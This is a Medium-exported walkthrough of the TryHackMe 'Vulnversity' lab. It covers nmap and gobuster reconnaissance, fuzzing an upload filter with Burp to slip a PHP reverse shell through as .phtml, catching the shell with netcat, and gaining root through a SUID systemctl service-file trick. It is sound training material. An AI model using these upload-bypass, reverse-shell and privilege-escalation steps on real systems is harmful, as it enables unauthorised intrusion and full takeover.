<div>

# Bypassing Upload Restrictions and Gaining Root {#bypassing-upload-restrictions-and-gaining-root .p-name}

</div>

::: {.section .p-summary field="subtitle"}
TryHackMe: Vulnversity Walkthrough
:::

::: {.section .e-content field="body"}
::: {#ec9b .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

::: section-content
::: {.section-inner .sectionLayout--insetColumn}
###   {#3b33 .graf .graf--h3 .graf--empty .graf--leading .graf--title name="3b33"}

### Bypassing Upload Restrictions and Gaining Root {#d704 .graf .graf--h3 .graf-after--h3 name="d704"}

#### TryHackMe: Vulnversity Walkthrough {#302c .graf .graf--h4 .graf-after--h3 name="302c"}

This walkthrough explores the **Vulnversity** room on the TryHackMe
platform, focusing on bypassing upload restrictions on a web server to
gain shell access and escalate privileges. The room provides an engaging
opportunity to explore vulnerabilities in web applications and develop
offensive security skills.

### Prerequisites {#c364 .graf .graf--h3 .graf-after--p name="c364"}

To effectively follow along, having a basic understanding of the
following is beneficial:

1.  [Nmap]{#3e74}
2.  [\
    ]{#f07a}
3.  [Directory Busting (e.g., Gobuster)]{#3c6a}
4.  [\
    ]{#3dd5}
5.  [Burp Suite]{#9548}
6.  [\
    ]{#a67e}
7.  [Linux file systems, permissions, SUIDs, and environment
    variables]{#6e18}
8.  [\
    ]{#3b3e}

### Objectives {#f148 .graf .graf--h3 .graf-after--li name="f148"}

1.  [Perform reconnaissance to gather information about the
    target.]{#f9eb}
2.  [\
    ]{#c885}
3.  [Identify hidden directories on the web server.]{#580a}
4.  [\
    ]{#0da9}
5.  [Exploit upload functionality to gain a shell on the web
    server.]{#5075}
6.  [\
    ]{#73f2}
7.  [Escalate privileges to root and retrieve the final flag.]{#818f}
8.  [\
    ]{#7597}

### Learning Outcomes {#e3a6 .graf .graf--h3 .graf-after--li name="e3a6"}

1.  [Learn Nmap flags for effective host scanning.]{#6ab3}
2.  [\
    ]{#3bce}
3.  [Use Gobuster to identify hidden web directories.]{#6ae7}
4.  [\
    ]{#aeb0}
5.  [Understand how to bypass file upload restrictions to gain
    access.]{#f51a}
6.  [\
    ]{#7bc7}
7.  [Perform privilege escalation on Linux systems.]{#54fd}
8.  [\
    ]{#6f9e}

### Walkthrough {#9835 .graf .graf--h3 .graf-after--li name="9835"}

#### Task 1: Deploy the Machine {#4939 .graf .graf--h4 .graf-after--h3 name="4939"}

1.  [Connect to the TryHackMe network using OpenVPN:]{#06fd}

``` {#7750 .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

-   [`sudo openvpn <config_file>.ovpn`{.markup--code
    .markup--li-code}]{#194d}

``` {#360f .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

``` {#8718 .graf .graf--pre .graf--empty .graf-after--pre .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

1.  [\
    ]{#cd35}
2.  [Confirm the connection by verifying the `tun0`{.markup--code
    .markup--li-code} or `tun1`{.markup--code .markup--li-code}
    interface using:]{#6142}

``` {#e958 .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

-   [`ifconfig`{.markup--code .markup--li-code}]{#0fbf}

``` {#67e4 .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

``` {#8c55 .graf .graf--pre .graf--empty .graf-after--pre .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

1.  [\
    ]{#dcbf}

#### Task 2: Reconnaissance with Nmap {#c282 .graf .graf--h4 .graf-after--li name="c282"}

Run an Nmap scan to enumerate open ports and services on the target:

``` {#bf2b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
nmap -sC -sV -oN vulnversity_scan.txt <target_IP>
```

-   [This scan reveals open ports, running services, and their
    versions.]{#2e9f}
-   [\
    ]{#5ac5}
-   [Example output indicates HTTP service running on port 3333.]{#d18b}
-   [\
    ]{#7ff7}

#### Task 3: Directory Enumeration {#b321 .graf .graf--h4 .graf-after--li name="b321"}

Use Gobuster to locate hidden directories:

``` {#455d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ruby"}
gobuster dir -u http://<target_IP>:3333 -w /usr/share/wordlists/dirb/common.txt
```

-   [The scan reveals several directories. Accessing the
    `/internal`{.markup--code .markup--li-code} directory presents a
    file upload form.]{#79e7}
-   [\
    ]{#a88f}

#### Task 4: Bypassing File Upload Restrictions {#1c9a .graf .graf--h4 .graf-after--li name="1c9a"}

1.  [Attempt to upload files of various extensions.]{#3329}
2.  [\
    ]{#0845}

-   [Extensions like `.png`{.markup--code .markup--li-code}
    and `.jpeg`{.markup--code .markup--li-code} fail due to
    restrictions.]{#73c9}
-   [\
    ]{#7994}

1.  [\
    ]{#a3e2}
2.  [Use **Burp Suite** to intercept upload requests and fuzz for
    allowed extensions.]{#730a}
3.  [\
    ]{#9b71}

-   [Set up the intruder to fuzz the file extension field.]{#31a5}
-   [\
    ]{#7564}
-   [Identify `.phtml`{.markup--code .markup--li-code} as an allowed
    extension.]{#c31e}
-   [\
    ]{#ce29}

1.  [\
    ]{#1cee}
2.  [Modify a PHP reverse shell script (e.g.,
    `php-reverse-shell.php`{.markup--code .markup--li-code}) with your
    local IP and listening port:]{#1d21}
3.  [\
    ]{#321d}

``` {#1def .graf .graf--pre .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.phtml
```

1.  [Set up a Netcat listener to catch the reverse shell:]{#7151}
2.  [\
    ]{#cc13}

``` {#1169 .graf .graf--pre .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lvnp 1234
```

1.  [Upload the modified `.phtml`{.markup--code .markup--li-code} script
    and access it via the browser:]{#755c}
2.  [\
    ]{#c109}

-   [Navigate to:
    `http://<target_IP>:3333/internal/uploads/shell.phtml`{.markup--code
    .markup--li-code}]{#210e}
-   [\
    ]{#ab6f}
-   [This triggers the reverse shell connection.]{#07ee}
-   [\
    ]{#86b5}

1.  [\
    ]{#b965}

#### Task 5: Privilege Escalation {#16e0 .graf .graf--h4 .graf-after--li name="16e0"}

1.  [Enumerate the file system and identify potential privilege
    escalation vectors:]{#4b75}

``` {#d710 .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

-   [`find / -user root -perm -4000 -exec ls -ldb {} \;`{.markup--code
    .markup--li-code}]{#d13f}

``` {#adc9 .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

``` {#4594 .graf .graf--pre .graf--empty .graf-after--pre .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

1.  [\
    ]{#ec50}

-   [Notable discovery: `/bin/systemctl`{.markup--code .markup--li-code}
    with the SUID bit set.]{#0e9f}
-   [\
    ]{#9773}

1.  [\
    ]{#40b7}
2.  [Use GTFOBins to create a privilege escalation exploit for
    `systemctl`{.markup--code .markup--li-code}:]{#57c5}

``` {#c3d7 .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

-   [`echo '[Service] ExecStart=/bin/bash -p' > /tmp/root.service systemctl link /tmp/root.service systemctl enable /tmp/root.service systemctl start /tmp/root.service`{.markup--code
    .markup--li-code}]{#d095}

``` {#423d .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

``` {#d28b .graf .graf--pre .graf--empty .graf-after--pre .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

1.  [\
    ]{#b5b6}

-   [This grants a root shell.]{#f66c}
-   [\
    ]{#cbeb}

1.  [\
    ]{#7db2}
2.  [Verify escalated privileges and retrieve the root flag:]{#32dd}

``` {#95bd .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

-   [`whoami cat /root/root.txt`{.markup--code .markup--li-code}]{#cd9e}

``` {#0d7c .graf .graf--pre .graf--empty .graf-after--li .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

``` {#24c3 .graf .graf--pre .graf--empty .graf-after--pre .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
```

1.  [\
    ]{#8131}

### Conclusion {#1cbf .graf .graf--h3 .graf-after--li name="1cbf"}

This walkthrough demonstrated how to bypass upload restrictions on a
vulnerable web server, gain shell access, and escalate privileges to
root. The Vulnversity room offers a practical, hands-on learning
experience for web application security and privilege escalation
techniques.

I hope this write-up helps! Feel free to leave feedback or ask any
questions in the comments.

\
:::
:::
:::
:::

[View original.](https://medium.com/p/426b4d7f09d6)

Exported from [Medium](https://medium.com) on February 13, 2025.
